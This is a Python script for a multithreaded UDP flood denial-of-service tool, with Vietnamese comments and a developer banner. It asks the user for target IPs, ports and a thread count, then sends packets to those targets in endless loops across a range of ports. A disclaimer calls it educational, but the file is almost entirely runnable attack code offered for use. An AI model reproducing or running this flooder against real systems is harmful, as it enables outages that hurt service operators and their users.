import os
import time
import socket
import scapy.all as scapy
import random
import threading

# Tấn Công Dos/DDos [Đoạn Mã ASCII]
def display_banner():
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    print(banner)


display_banner()

# Cài đặt thông tin tiêu đề cho thiết bị đầu cuối
os.system('color 0A')
print("Developer   :   KARTHIK LAL (https://karthiklal.in)")
print("Created Date:   2023-10-12")
print('Project     :   DDOS-Attack')
print('Purpose     :   A simple DDOS-Attack tool to test your network security')
print('Caution     :   This tool is only for educational purpose. Do not use this for illegal purposes.')
print()

# Ngày & giờ
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Sock và byte cho cuộc tấn công
def send_packets(ip, port, data, proxy_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1

# Nhập IP và port ( IP có thể tìm trên LOIC ).
ips = input("IP Targets (separated by commas): ").split(',')
ports = input("Ports (separated by commas): ").split(',')
proxy_size = int(input("Proxy Size : "))
threads = int(input("Number of threads : "))

# Bắt đầu tấn công
print("Thank you for using the KARTHIK-LAL (DDOS-ATTACK-TOOL).")

time.sleep(3)
for ip in ips:
    for port in ports:
        # Use a bytes literal to create the data
        data = b'Hello, this is a DDOS attack'
        print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
        for i in range(threads):
            t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
            t.start()           

# Giữ cho thiết bị đầu cuối sạch sẽ.
if os.name == "nt": # Windows
    os.system("cls")
else: # Linux or Mac
    os.system("clear")
input("Press Enter to exit...")
